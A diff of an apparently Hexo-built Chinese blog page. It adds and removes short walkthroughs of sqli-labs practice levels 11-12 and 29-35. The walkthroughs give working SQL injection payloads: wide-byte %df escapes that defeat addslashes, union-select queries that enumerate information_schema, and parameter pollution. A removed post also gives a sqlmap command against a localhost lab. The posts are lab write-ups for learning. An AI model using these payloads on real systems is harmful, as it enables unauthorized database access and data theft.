@@ -64,6 +64,103 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-25" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/08/page-25/" class="article-date">
+  <time datetime="2021-02-08T08:28:59.000Z" itemprop="datePublished">2021-02-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/08/page-25/">sqlilabs 34 35</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>a这关和上面一样只不过get变成post 那就用burp </p>
+<p>先随便输一个username 和password 抓包 改包</p>
+<p>uname=aaa&amp;passwd=aaa&amp;submit=Submit 对这一串进行更改</p>
+<p>uname=aaa%df’ union select 1,database（） –+&amp;passwd=aaa&amp;submit=Submit  还是需要打上%df 就可以了 </p>
+<p>之后还是那套组合拳 </p>
+<p>group_concat(table_name) from information_schema.tables where table_schema=’database()’ –+</p>
+<p>35和34 凑一凑吧 毕竟35真的不多的内容 </p>
+<p>这关就是数字型注入了那么反斜杠的过滤就没用了 直接?id=1 union select 1,2,3 –+ 然后就是标准组合拳</p>
+<p>一套下来 就可以了</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/08/page-25/" data-id="ckkwc20gp0001iwv701xc1bwh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-page-24" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/08/page-24/" class="article-date">
+  <time datetime="2021-02-08T05:54:12.000Z" itemprop="datePublished">2021-02-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/08/page-24/">sqlilabs 32 33</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>32很神奇 输入单双引号 或者加上括号都会出现<img src="https://img2018.cnblogs.com/blog/1675852/201905/1675852-20190531000842735-239639599.png" alt="img">这么个情况 被加上了个斜杠 被注释掉了</p>
+<p>这归功于php的preg_quote函数的功劳 </p>
+<p>这个需要参数str（输入的字符串）并向其中每个正则表达式的字符前面加个反斜杠 </p>
+<p>代码长这样</p>
+<p>function check_addslashes($string)<br>{<br>    $string = preg_replace(‘/‘. preg_quote(‘\‘) .’/‘, “\\\“, $string);          //escape any backslash<br>    $string = preg_replace(‘/&#39;/i’, ‘\&#39;‘, $string);                               //escape single quote with a backslash<br>    $string = preg_replace(‘/&quot;/‘, “\&quot;“, $string);                                //escape double quote with a backslash</p>
+<pre><code>return $string;</code></pre>
+<p>}</p>
+<p>字符集编码设置为gbk可使用宽字节注入 </p>
+<p>尝试%df  反斜杠是%5c 那么就会变成一个整体%df5c  mysql认为前两个字符为汉字 （其实浏览器的字符编码不设置也没差就显示一个乱码而已看着有点怪而已） 然后单引号就可以逃脱出来了 </p>
+<p>?id=0%df’ union select 1,2,3 –+ 测显位</p>
+<p>然后?id=0%df’ union select 1,2,database() –+ </p>
+<p>接下去就是那套组合拳 很容易了</p>
+<p>爆表名字那些的时候table_schema=’security’  这个单引号也滤掉了 但是用%df’ 前头的逃出来了 后头那个没有</p>
+<p>那么就再简单些= database（） </p>
+<p>爆列的时候也可直接还是用 table_schema=database()  </p>
+<p>33和32一样只不过换成了addslashes（）函数 用的语句都是一样的</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/08/page-24/" data-id="ckkwc20gm0000iwv70mkm8q5t" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-page-23" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/07/page-23/" class="article-date">
@@ -78,7 +175,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/07/page-23/">sqlilabs 29</a>
+      <a class="article-title" href="/2021/02/07/page-23/">sqlilabs 29 30 31</a>
     </h1>
   
 
@@ -93,6 +190,8 @@
 <p>?id=1&amp;id=-1’ union select 1,2,3 –+ 显位</p>
 <p>?id=1&amp;id=-1’ union select 1,2,database() –+  数据库</p>
 <p>之后就是一顿操作组合拳 就可以了和之前的一样的语句</p>
+<p>30的话双引号就ok了 没别的什么区别了</p>
+<p>31就双引号加括号 就可以了</p>
 
       
     </div>
@@ -418,97 +517,11 @@
 
 
   
-    <article id="post-page-11" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/01/24/page-11/" class="article-date">
-  <time datetime="2021-01-24T09:35:33.000Z" itemprop="datePublished">2021-01-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/24/page-11/">page十一关手动注入 十二也可以</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>先判断注入类型 </p>
-<p>用火狐下载个插件hackbar </p>
-<p>然后 post data那边输入 uname=admin（这个后面输入一个符号之类的判断注入类型）#&amp;passwd=admin&amp;submit=Submit （十二关是双引号 就加上“））</p>
-<p>这关的就有提示单引号注入 那么uname=admin’ #&amp;passwd=admin&amp;submit=Submit 输入这段</p>
-<p>登陆成功  然后uname=admin’  order by 2（这个数字可以慢慢试看到多少的时候显示登陆错误）#&amp;passwd=admin&amp;submit=Submit 这个是用来的出显示位数的</p>
-<p>接下来使用联合查询语句 union select 来进行爆破，使用union select的时候要注意，输入的unname必须是一个不存在的，，否则将会输出不出来</p>
-<p>uname=aaa’ union select 1,2#&amp;passwd=admin&amp;submit=Submit 比如这样子</p>
-<p>uname=aaa’ union select user(),version() #&amp;passwd=admin&amp;submit=Submit这句爆出使用者和数据库版本</p>
-<p>之后操作就和第一关是一样的都是那些语句</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/24/page-11/" data-id="ckkay6gmn0000p0v78d5dgon8" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-page-9" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/01/22/page-9/" class="article-date">
-  <time datetime="2021-01-22T12:27:10.000Z" itemprop="datePublished">2021-01-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/22/page-9/">sqlmap抓包功能</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>a老样子 win+r cmd sqlmap.py -u “想抓哪关的包的地址例如：<a target="_blank" rel="noopener" href="http://localhost/sqli-labs/Less-11/&quot;">http://localhost/sqli-labs/Less-11/&quot;</a> –forms  –thread 10 -dbs  </p>
-<p>这个会出现一句话例如这样Edit POST data [default: uname=&amp;passwd=&amp;submit=Submit] (Warning: blank fields detected):</p>
-<p>按照上面的要求就在后面输入 uname=aaa（随便）&amp;passwd=aaa（随便）&amp;submit=Submit</p>
-<p>也可选择默认方式后面加个–batch</p>
-<p>这速度也挺快的</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/22/page-9/" data-id="ckk89f7cc0000g0v78fw7hsus" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -540,7 +553,15 @@
       <ul>
         
           <li>
-            <a href="/2021/02/07/page-23/">sqlilabs 29</a>
+            <a href="/2021/02/08/page-25/">sqlilabs 34 35</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/08/page-24/">sqlilabs 32 33</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/07/page-23/">sqlilabs 29 30 31</a>
           </li>
         
           <li>
@@ -549,14 +570,6 @@
         
           <li>
             <a href="/2021/02/05/page-20/">sqlilabs 26</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/01/page-19/">sqlilabs 25 25a</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/01/page-17/">sqli-labs less 24</a>
           </li>
         
       </ul>
